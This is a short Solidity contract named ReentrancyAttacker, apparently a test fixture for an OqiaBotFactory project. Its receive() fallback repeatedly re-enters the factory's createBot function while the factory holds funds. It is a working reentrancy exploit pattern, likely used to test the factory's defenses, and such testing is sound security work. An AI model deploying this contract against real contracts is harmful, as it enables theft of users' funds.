// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../OqiaBotFactory.sol";

contract ReentrancyAttacker {
    OqiaBotFactory public factory;
    address public attacker;
    uint256 public tokenId;

    constructor(address _factory) {
        factory = OqiaBotFactory(_factory);
        attacker = msg.sender;
    }

    function attack() external payable {
        (bool success, ) = address(factory).call{value: msg.value}(
            abi.encodeWithSignature("createBot(address)", address(this))
        );
        require(success, "Initial call failed");
    }

    receive() external payable {
        // Reentrant call
        if (address(factory).balance >= 0.001 ether) {
            (bool success, ) = address(factory).call{value: 0.001 ether}(
                abi.encodeWithSignature("createBot(address)", address(this))
            );
            require(success, "Reentrant call failed");
        }
    }
}
